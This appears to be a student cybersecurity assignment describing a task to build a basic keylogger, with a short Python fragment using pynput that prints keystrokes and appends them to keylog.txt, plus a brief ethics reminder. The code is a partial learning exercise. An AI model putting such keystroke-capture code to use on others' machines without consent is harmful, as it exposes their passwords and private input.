PRODIGY-CS-CYBERSECURITY-main

TASK 4:
Create a basic keylogger program that records and logs keystrokes. Focus on logging the keys pressed and saving them to a file. Note: Ethical considerations and permissions are crucial for projects involving keyloggers. from pynput import keyboard This line imports the keyboard module from the pynput library, which is used for monitoring and controlling input devices, such as keyboards and mice. def keyPressed(key): print(str(key)) with open("keylog.txt", 'a') as logkey: try: char = key.char logkey.write(char) except: print("Error getting char")
